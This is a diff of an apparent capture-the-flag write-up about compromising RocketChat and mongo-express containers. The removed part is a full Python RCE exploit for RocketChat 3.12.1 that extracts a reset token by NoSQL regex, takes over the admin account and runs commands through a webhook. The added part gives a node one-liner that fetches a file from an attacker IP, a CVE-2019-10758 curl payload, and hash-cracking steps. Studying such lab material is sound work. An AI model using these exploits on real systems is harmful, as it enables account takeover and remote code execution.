@@ -52,125 +52,14 @@ Webhooks can be invoked by curl, and the full curl command is helpfully provided
 
 With RCE, the box was enumerated slowly. Its a tied down docker container, with none of the common tools. To upload I changed rocket chats settings to use the file system and /tmp folder, and then uploaded files into chat. They would be placed in /tmp with random file names, but were otherwise fine.
 
-## Revised RocketChat Exploit
+Step 2: mongo-express exploit
 
-This is a modification of the exploit-db script. It should just require an admin email address (admin@rocket.thm) and a target (http://chat.rocket.thm)
+Even though the machine is missing most tools, you can download files with node using a simple one liner: `node -e 'require("http").get("http://10.10.16.78:1234/client", res => res.pipe(require("fs").createWriteStream("client")))'`. If this is hard to send through the limited shell, base64 it and then decode after saving to a file.
 
-```python
-#!/usr/bin/python
+env reveals mongodb on 172.17.0.2 which after pivoting can be accessed with mongo cli, but there is nothing in there
 
-import requests
-import string
-import time
-import hashlib
-import json
-import argparse
-import sys
+on 172.17.0.4 is a web interface for mongo, using mongo-express (identified by port 8081 and express returned in the headers). this is vulnerable to CVE-2019-10758, a very simple exploit which can be invoked with curl: `proxychains curl 'http://172.17.0.4:8081/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw=='  --data 'document=this.constructor.constructor("return pr")().mainModule.require("child_process").execSync("id")'`. this will return 'valid' if the command succeeds, which can be helpful.
 
-parser = argparse.ArgumentParser(description='RocketChat 3.12.1 RCE')
-parser.add_argument('-a', help='Administrator email', default='admin@rocket.thm')
-parser.add_argument('-t', help='URL (Eg: http://rocketchat.local)', default='http://chat.rocket.thm')
-parser.add_argument('-p', help='Password to set (default is P@$$w0rd!1234)', default=b'P@$$w0rd!1234')
-args = parser.parse_args()
+once having a shell as root, you can find a backup folder at /backup/db_backup/meteor. in here is bson.hash which contains a simple user/password for the user Terrance, the password in bcrypt.
 
-adminmail = args.a
-target = args.t
-passToSet = args.p
-
-def forgotpassword(email,url):
-	payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+email+'\\"]}"}'
-	headers={'content-type': 'application/json'}
-	r = requests.post(url+"/api/v1/method.callAnon/sendForgotPasswordEmail", data = payload, headers = headers, verify = False, allow_redirects = False)
-	print("[+] Password Reset Email Sent")
-
-def resettoken(url):
-	u = url+"/api/v1/method.callAnon/getPasswordPolicy"
-	headers={'content-type': 'application/json'}
-	token = ""
-
-	num = list(range(0,10))
-	string_ints = [str(int) for int in num]
-	characters = list(string.ascii_uppercase + string.ascii_lowercase) + list('-')+list('_') + string_ints
-
-	while len(token)!= 43:
-		for c in characters:
-			payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"getPasswordPolicy\\",\\"params\\":[{\\"token\\":{\\"$regex\\":\\"^%s\\"}}]}"}' % (token + c)
-			r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
-			time.sleep(0.5)
-			if 'Meteor.Error' not in r.text:
-				token += c
-				print(f"Got: {token}")
-
-	print(f"[+] Got token : {token}")
-	return token
-
-def changingpassword(url,token):
-	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"'+str(passToSet)+'\\"]}"}'
-	headers={'content-type': 'application/json'}
-	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
-	if "error" in r.text:
-		exit("[-] Wrong token")
-	print("[+] Admin Password was changed !")
-	
-def auth(url):
-	# Authenticating
-	sha256pass = hashlib.sha256(passToSet).hexdigest()
-	headers={'content-type': 'application/json'}
-	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
-	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
-	if "error" in r.text:
-		return False
-	data = json.loads(r.text)
-	data =(data['message'])
-	userid = data[32:49]
-	token = data[60:103]
-	return userid,token
-
-def rce(url,userid,token,cmd):
-	# Creating Integration
-	payload = '{"enabled":true,"channel":"#general","username":"admin","name":"rce","alias":"","avatarUrl":"","emoji":"","scriptEnabled":true,"script":"class Script { process_incoming_request() { const require = console.log.constructor(\'return process.mainModule.require\')(); const { execSync } = require(\'child_process\'); res = execSync(\''+cmd+'\'); return { error: { sucess: true, message: res.toString() } } } }","type":"webhook-incoming"}'
-	cookies = {'rc_uid': userid,'rc_token': token}
-	headers = {'X-User-Id': userid,'X-Auth-Token': token}
-	r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
-	data = r.text
-	data = data.split(',')
-	token = data[14]
-	token = token[9:57]
-	_id = data[20]
-	_id = _id[7:24]
-
-	# Triggering RCE
-	u = url + '/hooks/' + _id + '/' +token
-	r = requests.get(u)
-	res = json.loads(r.text)
-	print(res["message"])
-
-############################################################
-
-authRes = auth(target)
-if authRes == False:
-	## Sending Reset mail
-	print(f"[+] Resetting {adminmail} password")
-	forgotpassword(adminmail,target)
-
-	## Getting reset token
-	token = resettoken(target)
-
-	## Resetting Password
-	changingpassword(target,token)
-	
-	print("[+] authenticating as admin")
-	authRes = auth(target)
-	if authRes == False:
-		print("[-] failed to auth")
-		sys.exit()
-
-## Authenticating and triggering rce
-
-while True:
-	cmd = input("CMD:> ")
-	try:
-		rce(target,authRes[0],authRes[1],cmd)
-	except:
-		print("command failed")
-```
+this can be cracked with hashcat and rockyou, though takes ages
